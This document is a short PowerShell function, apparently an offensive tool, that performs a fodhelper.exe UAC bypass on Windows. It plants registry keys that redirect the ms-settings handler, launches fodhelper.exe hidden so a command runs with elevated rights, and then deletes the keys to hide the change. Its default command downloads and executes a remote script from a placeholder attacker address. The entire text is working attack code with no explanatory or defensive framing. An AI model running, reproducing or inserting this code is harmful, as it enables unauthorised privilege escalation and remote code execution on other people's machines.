function Bypass { 
    Param (    
        [String]$program = "IEX(New-Object Net.webclient).downloadString('http://[ATTACKER_IP]/run.txt')"
    )

    New-Item "HKCU:\Software\Classes\.sanjeet\Shell\Open\command" -Force
    Set-ItemProperty "HKCU:\Software\Classes\.sanjeet\Shell\Open\command" -Name "(default)" -Value $program -Force
    
    New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
    Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".sanjeet" -Force
    
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    
    Start-Sleep 3
    
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
    Remove-Item "HKCU:\Software\Classes\.sanjeet\" -Recurse -Force
}
